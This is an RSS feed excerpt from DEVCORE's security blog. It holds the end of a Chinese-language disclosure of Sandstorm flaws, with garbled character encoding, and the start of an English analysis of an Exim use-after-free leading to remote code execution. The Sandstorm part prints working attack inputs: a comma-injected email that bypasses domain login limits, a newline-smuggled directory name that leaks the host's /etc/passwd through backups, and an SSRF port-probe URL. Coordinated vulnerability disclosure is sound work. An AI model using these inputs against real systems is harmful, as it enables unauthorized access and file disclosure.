&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œç•¶æ”»æ“Šè€…å¡«å…¥çš„ email ç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;ï¼Œç³»çµ±ä¾¿æœƒå°‡æ”»æ“Šè€…è¦–ç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; çµ„ç¹”çš„ä½¿ç”¨è€…ã€‚&lt;/p&gt;

&lt;p&gt;é€™é …æ”»æ“Šå¾—ä»¥æˆåŠŸé‚„æœ‰å¦å¤–ä¸€å€‹é—œéµé»ï¼Œç™¼ç”Ÿåœ¨ Sandstorm ç™»å…¥çš„ä¸€å€‹ç‰¹è‰²ä¸Šã€‚ä½¿ç”¨ Sandstorm æœå‹™ä¸éœ€è¦è¨­å®šå¯†ç¢¼ï¼Œä½¿ç”¨è€…æ¯æ¬¡æ¬²ç™»å…¥æ™‚å¡«å…¥ emailï¼Œç³»çµ±ä¾¿æœƒç™¼é€ä¸€çµ„æ¯æ¬¡çš†ä¸åŒçš„éš¨æ©Ÿå¯†ç¢¼ä½œç‚ºç™»å…¥ä½¿ç”¨ã€‚ä¸Šè¿°çš„ä¾‹å­ä¹‹æ‰€ä»¥èƒ½å¤ æˆåŠŸï¼Œå°±æ˜¯å› ç‚ºç³»çµ±å°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; è¦–ç‚ºä¸€å€‹ aaa.bbb ç¶²åŸŸçš„ä½¿ç”¨è€…ï¼Œè€Œéš¨æ©Ÿå¯†ç¢¼æœƒç™¼é€åˆ° &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; ä»¥åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; å…©å€‹ä¸åŒä¿¡ç®±ä¸­ï¼Œåªè¦å¯ä»¥æ”¶åˆ°å¯†ç¢¼å°±å¯ä»¥ç™»å…¥ä½¿ç”¨æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;ç›´æ¥æ¡ˆä¾‹èªªæ˜ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ Sandstorm é™å®šåªæœ‰ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; ç¶²åŸŸæ‰å¯ä»¥ç™»å…¥ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç™»å…¥è™• email æ¬„ä½å¡«å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt;ã€‚ï¼ˆè¨»ï¼šemail æ¬„ä½åœ¨å‰ç«¯æœ‰ç”¨ HTML5 Validationï¼Œä½†å¾Œç«¯ä¸¦ç„¡æª¢æŸ¥ email æ˜¯å¦åˆæ³•ï¼‰&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ demo@devco.re ä¿¡ç®±æ”¶åˆ°éš¨æ©Ÿå¯†ç¢¼ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æˆåŠŸç™»å…¥ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; è¢«è¦–ç‚ºä¸€å€‹ä½¿ç”¨è€…ï¼Œä¸”ç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; çµ„ç¹”æˆå“¡ï¼&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨æˆ‘å€‘çš„æ»²é€æ¸¬è©¦ä¸­ï¼Œæ¨™çš„ç¶²ç«™æ˜¯å…è¨±èªè­‰çš„ç¶²åŸŸä½¿ç”¨è€…è‡ªè¡Œå®‰è£ App çš„ã€‚å› æ­¤é€éé€™é …ç¹éå¼±é»ï¼Œæ”»æ“Šè€…å¯ä»¥å†æ­é…æœ¬ç¯‡å…¶ä»–æ¼æ´ï¼ˆCVE-2017-6198ã€CVE-2017-6200ã€CVE-2017-6201ï¼‰åšæ›´é€²ä¸€æ­¥çš„æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹æœ‰è¶£çš„å¼±é»ï¼Œç¸½å…±çµ„åˆäº†å…©å€‹é©—è­‰ä¸Šçš„å°ç–å¿½æ‰èƒ½é”æˆæ”»æ“Šï¼&lt;br /&gt;
åœ¨ Sandstorm ä¸­æ¯å€‹ Grainï¼ˆSandstorm containerï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹ App æ²™ç®±ï¼‰çš„æ“æœ‰è€…éƒ½å¯ä»¥ä¸‹è¼‰è©² App çš„å‚™ä»½è³‡æ–™ï¼Œä½†ç”±æ–¼æ‰“åŒ…æµç¨‹ä¸­å­˜åœ¨å…©å€‹å¼±é»ï¼Œå› æ­¤æ”»æ“Šè€…å¯ä»¥æ‰“åŒ…æ²™ç®±å¤–ä¼ºæœå™¨çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; å’Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; ä¸‹çš„æª”æ¡ˆã€‚ç™¼ç”Ÿçš„å•é¡Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;æ‰“åŒ…çš„æµç¨‹éš±è—äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; ç­‰æ•æ„Ÿç›®éŒ„ï¼Œå»æ²’æœ‰éš±è— &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; é€™å…©å€‹ç›®éŒ„ã€‚é€™å…©å€‹ç›®éŒ„åˆ†åˆ¥æ˜¯ä¼ºæœå™¨ä¸‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt; å’Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;/run&lt;/code&gt; çš„åˆ¥åï¼Œæ˜¯è¼ƒå¾ŒæœŸçš„åŠŸèƒ½ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç³»çµ±æœƒå°‡æ¬²æ‰“åŒ…çš„åˆæ³•æª”æ¡ˆæ•´ç†å‡ºä¾†é€éæ¨™æº–è¼¸å…¥ä»‹é¢å‚³çµ¦ zip æ‰“åŒ…ï¼Œè€Œåˆ¤æ–·æª”æ¡ˆå’Œæª”æ¡ˆé–“çš„å€éš”æ˜¯é æ›è¡Œç¬¦è™Ÿ(&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;)ã€‚å› æ­¤ï¼Œç•¶æª”åä¸­å‡ºç¾æ›è¡Œç¬¦è™Ÿï¼Œå¯ä»¥æ’å…¥éæ³•çš„è·¯å¾‘æª”åè—‰ç”± zip æ‰“åŒ…ã€‚ç¨‹å¼é›–ç„¶æœ‰æª¢æŸ¥æª”åæ˜¯å¦å­˜åœ¨æ›è¡Œç¬¦ï¼Œå»ç–å¿½äº†æª¢æŸ¥ç›®éŒ„åã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¶œåˆä¸Šè¿°å…©å€‹å¼±é»ï¼Œæ”»æ“Šè€…åªè¦åœ¨æ²™ç®±å…§å»ºç«‹ä¸€å€‹ç›®éŒ„ &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;ï¼Œå°±å¯ä»¥é€éä¸‹è¼‰å‚™ä»½çš„åŠŸèƒ½å–å¾—å«æœ‰ä¼ºæœå™¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; æª”æ¡ˆçš„å‚™ä»½æª”ã€‚&lt;/p&gt;

&lt;p&gt;å¯¦éš›æƒ…å¢ƒæˆªåœ–ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;å…ˆåœ¨ Grain è£¡æ–°å»ºç›®éŒ„ &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;ï¼Œä¸¦ç”¨ Grain Backup çš„åŠŸèƒ½ä¸‹è¼‰å‚™ä»½æª”ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è§£é–‹å‚™ä»½æª”å¾Œåœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; ç›®éŒ„ä¸‹çœ‹åˆ°æ²™ç®±å¤–ä¼ºæœå™¨çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯ç¶“å…¸çš„ SSRFï¼ˆServer-Side Request Forgeryï¼‰å•é¡Œï¼Œåœ¨ Sandstorm å®‰è£ App æµç¨‹æ²’æœ‰é™åˆ¶å®‰è£ä¾†æºï¼Œæ”»æ“Šè€…æä¾›ä¸€å€‹å®‰è£ URL å°±èƒ½è®“ä¼ºæœå™¨å­˜å–è©²ä½ç½®ã€‚è©²å•é¡Œç™¼ç”Ÿåœ¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt;ï¼Œé€™å€‹ç¯„ä¾‹é€£çµå¾—ä»¥ç¢ºèªä¼ºæœå™¨çš„ 22 port æ˜¯å¦é–‹å•Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;ï¼ˆParse Errorï¼Œä»£è¡¨ä¼ºæœå™¨ 22 port é–‹å•Ÿï¼‰&lt;/center&gt;

&lt;h2 id=&quot;å¾ŒçºŒ&quot;&gt;å¾ŒçºŒ&lt;/h2&gt;

&lt;p&gt;åœ¨æäº¤å¼±é»å¾Œï¼ŒSandstorm å®˜æ–¹éå¸¸è¿…é€Ÿä¿®æ­£äº†å¼±é»ï¼Œä¸¦ä¸”ç™¼è¡¨äº†ä¸€ç¯‡æ–‡ç« ï¼š&lt;br /&gt;
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™æ¬¡æ»²é€ç¶“é©—ä¸­ï¼Œæˆ‘å€‘èªç‚º Sandstorm æ˜¯ä¸€æ¬¾å®‰å…¨ã€æœ‰å‡ºè‰²é˜²ç¦¦æ©Ÿåˆ¶çš„å¹³å°ã€‚ä¸»è¦åŸå› å–æ±ºæ–¼å®ƒçš„ä¸€å€‹æ ¸å¿ƒè¨­è¨ˆç†å¿µï¼šå°±æ˜¯å‡è¨­ä½¿ç”¨è€…å®‰è£çš„ App éƒ½æ˜¯æƒ¡æ„çš„ã€‚ä»¥é€™æ¨£çš„å‰æå‡ºç™¼å»ä¿è­·æ ¸å¿ƒç³»çµ±çš„å®‰å…¨ï¼Œå»ºç«‹èµ·ä¾†çš„é˜²ç¦¦æ©Ÿåˆ¶è‡ªç„¶æ˜¯å…¨é¢ä¸”å®Œå–„çš„ã€‚é™¤äº†ä¼ºæœå™¨æœ¬èº«çš„ä¿è­·ï¼Œä¸€äº›å¸¸è¦‹çš„å®¢æˆ¶ç«¯æ”»æ“Šï¼ˆä¾‹å¦‚ï¼šXSSã€CSRFï¼‰ä¹Ÿé€é Sandstorm ç‰¹æ®Šçš„éš¨æ©Ÿ hostname ç­‰æ©Ÿåˆ¶ä¿è­·çš„å¾ˆå¥½ã€‚å› æ­¤æ”»æ“Šè€…å¾ˆé›£å¾ App æœ¬èº«å»ç ´å£ä¼ºæœå™¨ï¼Œä¹Ÿå¾ˆé›£é€éæ”»æ“Šå®¢æˆ¶ç«¯å»æå‡ä½¿ç”¨è€…çš„æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;å„˜ç®¡æ˜¯å¦‚æ­¤å„ªç§€çš„å¹³å°ï¼Œä»èˆŠæœƒå› ä¸€äº›å°åœ°æ–¹ç–å¿½å°è‡´æ”»æ“Šè€…æœ‰æ©Ÿå¯ä¹˜ã€‚é€™æ¬¡ç™¼ç¾å¼±é»çš„åœ°æ–¹å¤šåŠåœ¨æ–¼ library çš„èª¤ç”¨å’Œæ–°åŠŸèƒ½çš„æ’°å¯«æ²’æœ‰è€ƒæ…®åˆ°èˆŠæœ‰é˜²ç¦¦æ¶æ§‹ã€‚é€™åœ¨å…¶ä»–å°ˆæ¡ˆä¹Ÿæ˜¯å¸¸è¦‹çš„å•é¡Œï¼Œè—‰æ©Ÿä¹Ÿæé†’é–‹ç™¼è€…åœ¨é–‹ç™¼æ–°åŠŸèƒ½æ™‚æ‡‰åšå…¨é¢çš„å®‰å…¨æª¢è¦–ï¼Œä»¥é¿å…é˜²ç¦¦è½å·®æ‰€å°è‡´çš„å¼±é»ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
                <description>&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;about-exim&quot;&gt;About Exim&lt;/h2&gt;
&lt;p&gt;Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a &lt;a href=&quot;http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html&quot;&gt;mail server survey&lt;/a&gt; by E-Soft Inc. shows over half of the mail servers identified are running exim.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Exim version 4.88 &amp;amp; 4.89 with chunking option enabled.&lt;/li&gt;
  &lt;li&gt;According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h2&gt;
&lt;p&gt;Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like &lt;code class=&quot;highlighter-rouge&quot;&gt;BDAT 1024&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;BDAT 1024 LAST&lt;/code&gt;. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use-after-free in receive_msg leads to RCE (CVE-2017-16943)&lt;/li&gt;
  &lt;li&gt;Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;use-after-free-in-receive_msg-leads-to-rce&quot;&gt;Use-after-free in receive_msg leads to RCE&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_&lt;/code&gt; such as &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset&lt;/code&gt;. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/1.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Initially, exim allocates a big storeblock (default 0x2000) and then cut it into &lt;strong&gt;stores&lt;/strong&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; point to it. Exim maintains three &lt;code class=&quot;highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;, that is, there are three chains like the illustration above and every global variables are actually arrays.&lt;br /&gt;
This vulnerability is in &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; where exim reads headers: &lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* header_size += 256; */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;store_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to &lt;strong&gt;extend&lt;/strong&gt; store, the function &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; checks whether the old store is the latest store allocated in &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;. It returns False immediately if the check is failed.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276&quot;&gt;store.c: 276 store_extend&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; fails, exim tries to get a new store and release the old one. After we look into  &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; and store_release, we found that &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; returns a &lt;strong&gt;store&lt;/strong&gt;, but &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release&lt;/code&gt; releases a &lt;strong&gt;block&lt;/strong&gt; if the store is at the head of it. That is to say, if &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; points to the start the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; cuts store inside it for &lt;code class=&quot;highlighter-rouge&quot;&gt;newtext&lt;/code&gt;, then &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release(next-&amp;gt;text)&lt;/code&gt; frees &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, which is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, and leaves &lt;code class=&quot;highlighter-rouge&quot;&gt;newtext&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt; pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; after &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; reachable and finally leads to an RCE.&lt;br /&gt;
Exim uses &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136&quot;&gt;function pointers&lt;/a&gt; to switch between different input sources, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getbuf&lt;/code&gt;. When receiving BDAT data, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt; in order to check left chunking data size and to handle following command of BDAT. In &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt;, exim also uses &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;. It loops to read data, and stores data into &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, extends if insufficient.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
